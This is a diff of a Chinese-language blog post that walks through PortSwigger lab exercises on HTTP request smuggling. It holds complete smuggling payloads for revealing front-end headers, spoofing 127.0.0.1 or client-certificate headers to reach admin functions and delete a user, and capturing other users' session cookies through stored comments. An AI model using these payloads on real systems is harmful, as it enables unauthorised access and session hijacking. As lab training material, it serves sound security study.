@@ -5,11 +5,11 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="HTTP-request-smuggling, hackthebox,ctf,渗透">
-    <meta name="description" content="HTTP-request-smuggling(一)Black Hat USA 2022
+    <meta name="description" content="HTTP-request-smugglingBlack Hat USA 2022
 Black Hat USA 2020
 实用工具：
 https://github.com/defparam/smuggler
-https://hackbo">
+https://hackboton">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -422,7 +422,7 @@ https://hackbo">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="HTTP-request-smuggling-一"><a href="#HTTP-request-smuggling-一" class="headerlink" title="HTTP-request-smuggling(一)"></a>HTTP-request-smuggling(一)</h1><p><a target="_blank" rel="noopener" href="https://www.blackhat.com/us-22/briefings/schedule/#browser-powered-desync-attacks-a-new-frontier-in-http-request-smuggling-26414">Black Hat USA 2022</a></p>
+                <h1 id="HTTP-request-smuggling"><a href="#HTTP-request-smuggling" class="headerlink" title="HTTP-request-smuggling"></a>HTTP-request-smuggling</h1><p><a target="_blank" rel="noopener" href="https://www.blackhat.com/us-22/briefings/schedule/#browser-powered-desync-attacks-a-new-frontier-in-http-request-smuggling-26414">Black Hat USA 2022</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.blackhat.com/us-20/briefings/schedule/#http-request-smuggling-in---new-variants-new-defenses-and-new-challenges-20019">Black Hat USA 2020</a></p>
 <p>实用工具：</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/defparam/smuggler">https://github.com/defparam/smuggler</a></p>
@@ -699,6 +699,442 @@ x<span class="token operator">=</span><span class="token number">1</span>
 <p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-08_14.58.44.png" alt="截屏2022-10-08 14.58.44.png"></p>
 <p>另一个工具(http-request-smuggling-detection-tool)</p>
 <p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-08_15.03.32.png" alt="截屏2022-10-08 15.03.32.png"></p>
+<h2 id="Revealing-front-end-request-rewriting"><a href="#Revealing-front-end-request-rewriting" class="headerlink" title="Revealing front-end request rewriting"></a>Revealing front-end request rewriting</h2><p>在一些应用中，前端服务器在转发到后端服务器时进行请求重写，一般来说是加一些请求头，例如前端服务器也许会加：</p>
+<ul>
+<li>终止TLS连接并添加一些请求头来描述所使用的协议和加密方式</li>
+<li>添加一个X-Forwarded-For请求头来包含用户的IP地址</li>
+<li>根据用户的session token值来确定用户的ID，并添加一些请求头来标识用户</li>
+<li>添加一些对其他攻击者可能会感兴趣的敏感信息</li>
+</ul>
+<p>在某些情况下，如果走私请求的payload缺少一些前端服务器主动添加的请求头，那么后端服务器可能无法正常处理请求，导致走私请求无法达到预期的效果。</p>
+<p>有一种比较简单的方法可以准确地揭示前端服务器如何重写请求。为此，我们需要执行以下步骤：</p>
+<ul>
+<li>查找将请求参数的值反映到应用程序响应中的 POST 请求。</li>
+<li>随机排列参数，使反射的参数显示在消息正文的最后。</li>
+<li>将此请求走私到后端服务器，然后直接发送一个想要显示其重写形式的普通请求。</li>
+</ul>
+<p>例如当一个程序有一个登录函数可以反射email参数的值</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span>login HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token punctuation">.</span>com
+Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">28</span>
+
+email<span class="token operator">=</span>wiener@normal<span class="token operator">-</span>user<span class="token punctuation">.</span>net<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>当我们将这个请求发送给后端服务器，那么response包中将会包含以下结果：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>input id<span class="token operator">=</span><span class="token string double-quoted-string">"email"</span> value<span class="token operator">=</span><span class="token string double-quoted-string">"wiener@normal-user.net"</span> type<span class="token operator">=</span><span class="token string double-quoted-string">"text"</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>那么我们就可以根据response包中的结果来构造我们的paylaod，如下：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span> <span class="token operator">/</span> <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token operator">.</span>com
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">130</span>
+Transfer<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> chunked
+
+<span class="token number">0</span>
+
+<span class="token constant">POST</span> <span class="token operator">/</span>login <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token operator">.</span>com
+Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">100</span>
+
+email<span class="token operator">=</span><span class="token constant">POST</span> <span class="token operator">/</span>login <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token operator">.</span>com
+<span class="token operator">...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>前端服务器将重写请求以包含其他请求头，然后后端服务器将处理走私的请求，并将重写的第二个请求视为 email 参数的值。然后，它将在对第二个请求的响应中反映这个值，通俗理解就是将email=后面的邮箱值改成一个和原来相同的请求，这样后端服务器就会讲本来应该显示email的地方显示出钱端服务器添加的请求头</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>input id<span class="token operator">=</span><span class="token string double-quoted-string">"email"</span> value<span class="token operator">=</span>"<span class="token constant">POST</span> <span class="token operator">/</span>login <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token operator">.</span>com
+<span class="token constant">X</span><span class="token operator">-</span>Forwarded<span class="token operator">-</span><span class="token keyword">For</span><span class="token punctuation">:</span> <span class="token number">1.3</span><span class="token number">.3</span><span class="token number">.7</span>
+<span class="token constant">X</span><span class="token operator">-</span>Forwarded<span class="token operator">-</span>Proto<span class="token punctuation">:</span> https
+<span class="token constant">X</span><span class="token operator">-</span><span class="token constant">TLS</span><span class="token operator">-</span>Bits<span class="token punctuation">:</span> <span class="token number">128</span>
+<span class="token constant">X</span><span class="token operator">-</span><span class="token constant">TLS</span><span class="token operator">-</span>Cipher<span class="token punctuation">:</span> <span class="token constant">ECDHE</span><span class="token operator">-</span><span class="token constant">RSA</span><span class="token operator">-</span><span class="token constant">AES128</span><span class="token operator">-</span><span class="token constant">GCM</span><span class="token operator">-</span><span class="token constant">SHA256</span>
+<span class="token constant">X</span><span class="token operator">-</span><span class="token constant">TLS</span><span class="token operator">-</span>Version<span class="token punctuation">:</span> TLSv1<span class="token operator">.</span><span class="token number">2</span>
+x<span class="token operator">-</span>nr<span class="token operator">-</span>external<span class="token operator">-</span>service<span class="token punctuation">:</span> external
+<span class="token operator">...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>!Note</p>
+<p>由于最终请求正在重写，因此我们不知道它最终会持续多长时间。走私请求中内容长度请求头中的值将确定后端服务器认为该请求的长度。如果将此值设置得太短，则只会收到重写请求的一部分;如果设置得太长，后端服务器将超时等待请求完成。当然，解决方案是猜测一个比提交的请求大一点的初始值，然后逐渐增加该值以检索更多信息，直到拥有所有敏感信息位置。</p>
+<p>那么我们通过PortSwigger的实验来详细了解一下：</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting">Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting | Web Security Academy</a></p>
+<p>该试验的内容仍然是删除carlos用户（好惨一个人）</p>
+<p>首先我们找一个post页面，发现search the blog，那么我们首先抓个包：</p>
+<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-09_16.36.45.png" alt="截屏2022-10-09 16.36.45.png"></p>
+<p>我们删除一些无用的请求头，加上如下payload，第二个请求我们把CL设置大一些，方便将所有内容显示出来，记住加上Connection：close，否则可能会因为请求过大而导致一直在pipline中，导致收不到response，连续发送两次造成请求走私：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span> <span class="token operator">/</span> <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> <span class="token number">0</span>a0e00f3048826b9c0d124e9003b00a7<span class="token operator">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token operator">.</span>net
+Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">124</span>
+Transfer<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> chunked
+
+<span class="token number">0</span>
+
+<span class="token constant">POST</span> <span class="token operator">/</span> <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>
+Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">200</span>
+Connection<span class="token punctuation">:</span> close
+
+search<span class="token operator">=</span>test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-09_16.39.27.png" alt="截屏2022-10-09 16.39.27.png"></p>
+<p>我们可以看到返回了一些信息：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">0</span> search results <span class="token keyword">for</span> <span class="token string single-quoted-string">'testPOST / HTTP/1.1
+X-qbZyjE-Ip: 210.0.158.101
+Host: 0a0e00f3048826b9c0d124e9003b00a7.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 124
+Transfer-'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>那么我们可以看到X-*-Ip是前端服务器为我们加上的，那么我们就需要添加这个请求字段：</p>
+<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-09_16.43.36.png" alt="截屏2022-10-09 16.43.36.png"></p>
+<p>当我们这样访问的时候会发现这样一条信息：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">Admin <span class="token keyword">interface</span> <span class="token class-name-definition class-name">only</span> available <span class="token keyword">if</span> logged in <span class="token keyword">as</span> an administrator<span class="token punctuation">,</span> <span class="token keyword">or</span> <span class="token keyword">if</span> requested from <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>既然我们不知道管理员地址，那么我们就可以使用127.0.0.1，这样我们就可以去删除这个倒霉孩子了：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span> <span class="token operator">/</span> <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> <span class="token number">0</span>a0e00f3048826b9c0d124e9003b00a7<span class="token operator">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token operator">.</span>net
+Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">167</span>
+Transfer<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> chunked
+
+<span class="token number">0</span>
+
+<span class="token constant">POST</span> <span class="token operator">/</span>admin<span class="token operator">/</span>delete<span class="token operator">?</span>username<span class="token operator">=</span>carlos <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>
+Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
+<span class="token constant">X</span><span class="token operator">-</span>qbZyjE<span class="token operator">-</span>Ip<span class="token punctuation">:</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">10</span>
+Connection<span class="token punctuation">:</span> close
+
+x<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-09_16.45.47.png" alt="截屏2022-10-09 16.45.47.png"></p>
+<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-09_16.47.08.png" alt="截屏2022-10-09 16.47.08.png"></p>
+<h2 id="Bypassing-client-authentication"><a href="#Bypassing-client-authentication" class="headerlink" title="Bypassing client authentication"></a><strong><strong>Bypassing client authentication</strong></strong></h2><p>作为 TLS 握手的一部分，服务器通过提供证书向客户端（通常是浏览器）验证自己的身份。此证书包含其“公用名”Common Name（CN），该名称应与其注册的主机名匹配。然后，客户端可以使用它来验证它们是否正在与属于预期域的合法服务器通信。</p>
+<p>然而一些站点进一步实现了一种相互 TLS 身份验证（mTLS）形式，其中客户端还必须向服务器提供证书。在这种情况下，客户端的 CN 通常是用户名等，例如，它可以在后端应用程序逻辑中用作访问控制机制的一部分。</p>
+<p>验证客户端的组件通常通过一个或多个非标准 HTTP 请求头将证书中的相关详细信息传递给应用程序或后端服务器。例如，前端服务器有时会在任何传入请求中附加一个包含客户端 CN 的标头：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span> <span class="token operator">/</span>admin <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> normal<span class="token operator">-</span>website<span class="token operator">.</span>com
+<span class="token constant">X</span><span class="token operator">-</span><span class="token constant">SSL</span><span class="token operator">-</span><span class="token constant">CLIENT</span><span class="token operator">-</span><span class="token constant">CN</span><span class="token punctuation">:</span> carlos<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>由于这些请求头应该对用户完全隐藏，因此它们通常被后端服务器隐式信任。假设我们能够发送标头和值的正确组合，这可能使我们能够成功绕过访问控制。</p>
+<p>然而在实践中，这种行为通常不可利用，因为前端服务器倾向于覆盖这些标头（如果它们已经存在）。但是，走私的请求完全对前端隐藏，因此它们包含的任何标头都将原封不动地发送到后端。例如可以尝试如下利用方法，但是首先我们需要通过上面的请求重写来获取请求头</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span> <span class="token operator">/</span>example <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token operator">.</span>com
+Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">64</span>
+Transfer<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> chunked
+
+<span class="token number">0</span>
+
+<span class="token constant">GET</span> <span class="token operator">/</span>admin <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>
+<span class="token constant">X</span><span class="token operator">-</span><span class="token constant">SSL</span><span class="token operator">-</span><span class="token constant">CLIENT</span><span class="token operator">-</span><span class="token constant">CN</span><span class="token punctuation">:</span> administrator
+Foo<span class="token punctuation">:</span> x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="Capturing-other-users’-requests"><a href="#Capturing-other-users’-requests" class="headerlink" title="Capturing other users’ requests"></a><strong><strong>Capturing other users’ requests</strong></strong></h2><p>如果应用程序包含允许存储和检索文本数据的任何类型的功能，则可以使用HTTP请求走私来捕获其他用户请求的内容。这些可能包括会话令牌，启用会话劫持攻击或用户提交的一些其他敏感数据。用作此payload的合适功能是评论，电子邮件，个人资料描述，屏幕名称等。</p>
+<p>要执行攻击，首先需要走私一个向存储函数提交数据的请求，参数包含位于请求中最后的数据。后端服务器处理的下一个请求将附加到走私请求中，结果存储了其他用户的原始请求。</p>
+<p>假设应用程序使用以下请求来提交博客文章的评论，该评论将被存储并显示在博客上：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span>post<span class="token operator">/</span>comment HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token punctuation">.</span>com
+Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">154</span>
+Cookie<span class="token punctuation">:</span> session<span class="token operator">=</span>BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
+
+csrf<span class="token operator">=</span>SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0<span class="token operator">&amp;</span>postId<span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>comment<span class="token operator">=</span>My<span class="token operator">+</span>comment<span class="token operator">&amp;</span>name<span class="token operator">=</span>Carlos<span class="token operator">+</span>Montoya<span class="token operator">&amp;</span>email<span class="token operator">=</span>carlos<span class="token operator">%</span>40normal<span class="token operator">-</span>user<span class="token punctuation">.</span>net<span class="token operator">&amp;</span>website<span class="token operator">=</span>https<span class="token operator">%</span>3A<span class="token operator">%</span>2F<span class="token operator">%</span>2Fnormal<span class="token operator">-</span>user<span class="token punctuation">.</span>net<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我们可以尝试执行以下请求走私攻击，将数据存储请求走私到后端服务器：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">GET <span class="token operator">/</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token punctuation">.</span>com
+Transfer<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> chunked
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">324</span>
+
+<span class="token number">0</span>
+
+POST <span class="token operator">/</span>post<span class="token operator">/</span>comment HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token punctuation">.</span>com
+Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">400</span>
+Cookie<span class="token punctuation">:</span> session<span class="token operator">=</span>BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
+
+csrf<span class="token operator">=</span>SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0<span class="token operator">&amp;</span>postId<span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>name<span class="token operator">=</span>Carlos<span class="token operator">+</span>Montoya<span class="token operator">&amp;</span>email<span class="token operator">=</span>carlos<span class="token operator">%</span>40normal<span class="token operator">-</span>user<span class="token punctuation">.</span>net<span class="token operator">&amp;</span>website<span class="token operator">=</span>https<span class="token operator">%</span>3A<span class="token operator">%</span>2F<span class="token operator">%</span>2Fnormal<span class="token operator">-</span>user<span class="token punctuation">.</span>net<span class="token operator">&amp;</span>comment<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>当后端服务器处理其他用户的请求时，它将被附加到走私请求中（Comment=xxxx），结果是用户的请求被存储，包括受害者用户的会话cookie和任何其他敏感数据：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span>post<span class="token operator">/</span>comment HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token punctuation">.</span>com
+Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">400</span>
+Cookie<span class="token punctuation">:</span> session<span class="token operator">=</span>BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
+
+csrf<span class="token operator">=</span>SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0<span class="token operator">&amp;</span>postId<span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>name<span class="token operator">=</span>Carlos<span class="token operator">+</span>Montoya<span class="token operator">&amp;</span>email<span class="token operator">=</span>carlos<span class="token operator">%</span>40normal<span class="token operator">-</span>user<span class="token punctuation">.</span>net<span class="token operator">&amp;</span>website<span class="token operator">=</span>https<span class="token operator">%</span>3A<span class="token operator">%</span>2F<span class="token operator">%</span>2Fnormal<span class="token operator">-</span>user<span class="token punctuation">.</span>net<span class="token operator">&amp;</span>comment<span class="token operator">=</span>GET <span class="token operator">/</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token punctuation">.</span>com
+Cookie<span class="token punctuation">:</span> session<span class="token operator">=</span>jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后，您可以通过以正常方式检索存储的数据来检索其他用户请求的详细信息。</p>
+<p>通过靶场来看一下：</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests">Lab: Exploiting HTTP request smuggling to capture other users’ requests | Web Security Academy</a></p>
+<p>首先我们点击view post，准备发一个留言</p>
+<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-09_19.30.34.png" alt="截屏2022-10-09 19.30.34.png"></p>
+<p>我们可以看到留言的请求如下：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span>post<span class="token operator">/</span>comment HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> 0a39003a045004a9c0c11ef300c600e1<span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net
+Cookie<span class="token punctuation">:</span> session<span class="token operator">=</span>IAAGVCS5HZDv7vi0EfN5CAogNfg7JJQC
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">108</span>
+Cache<span class="token operator">-</span>Control<span class="token punctuation">:</span> <span class="token builtin">max</span><span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>
+Sec<span class="token operator">-</span>Ch<span class="token operator">-</span>Ua<span class="token punctuation">:</span> <span class="token string">"Chromium"</span><span class="token punctuation">;</span>v<span class="token operator">=</span><span class="token string">"91"</span><span class="token punctuation">,</span> <span class="token string">" Not;A Brand"</span><span class="token punctuation">;</span>v<span class="token operator">=</span><span class="token string">"99"</span>
+Sec<span class="token operator">-</span>Ch<span class="token operator">-</span>Ua<span class="token operator">-</span>Mobile<span class="token punctuation">:</span> ?<span class="token number">0</span>
+Upgrade<span class="token operator">-</span>Insecure<span class="token operator">-</span>Requests<span class="token punctuation">:</span> <span class="token number">1</span>
+Origin<span class="token punctuation">:</span> https<span class="token punctuation">:</span><span class="token operator">//</span>0a39003a045004a9c0c11ef300c600e1<span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net
+Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
+User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">91.0</span><span class="token number">.4472</span><span class="token number">.101</span> Safari<span class="token operator">/</span><span class="token number">537.36</span>
+Accept<span class="token punctuation">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>application<span class="token operator">/</span>signed<span class="token operator">-</span>exchange<span class="token punctuation">;</span>v<span class="token operator">=</span>b3<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span>
+Sec<span class="token operator">-</span>Fetch<span class="token operator">-</span>Site<span class="token punctuation">:</span> same<span class="token operator">-</span>origin
+Sec<span class="token operator">-</span>Fetch<span class="token operator">-</span>Mode<span class="token punctuation">:</span> navigate
+Sec<span class="token operator">-</span>Fetch<span class="token operator">-</span>User<span class="token punctuation">:</span> ?<span class="token number">1</span>
+Sec<span class="token operator">-</span>Fetch<span class="token operator">-</span>Dest<span class="token punctuation">:</span> document
+Referer<span class="token punctuation">:</span> https<span class="token punctuation">:</span><span class="token operator">//</span>0a39003a045004a9c0c11ef300c600e1<span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net<span class="token operator">/</span>post?postId<span class="token operator">=</span><span class="token number">9</span>
+Accept<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip<span class="token punctuation">,</span> deflate
+Accept<span class="token operator">-</span>Language<span class="token punctuation">:</span> zh<span class="token operator">-</span>CN<span class="token punctuation">,</span>zh<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span>
+Connection<span class="token punctuation">:</span> close
+
+csrf<span class="token operator">=</span>YEZrZ9zTbfBs02EZ0DGUKKfQK4IJIzQo<span class="token operator">&amp;</span>postId<span class="token operator">=</span><span class="token number">9</span><span class="token operator">&amp;</span>comment<span class="token operator">=</span>test<span class="token operator">-</span><span class="token number">1</span><span class="token operator">&amp;</span>name<span class="token operator">=</span>l1b3ri<span class="token operator">&amp;</span>email<span class="token operator">=</span>l1b3ri<span class="token operator">%</span>40github<span class="token punctuation">.</span>com<span class="token operator">&amp;</span>website<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看到comment=后面便是留言的内容，那么我们将comment参数放置最后并修改为test-2，看是否可以成功留言：</p>
+<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-09_19.32.56.png" alt="截屏2022-10-09 19.32.56.png"></p>
+<p>可以成功留言，那么我们构造数据包，让后一个用户的请求与我们的comment参数进行拼接，使其可以显示到留言板</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
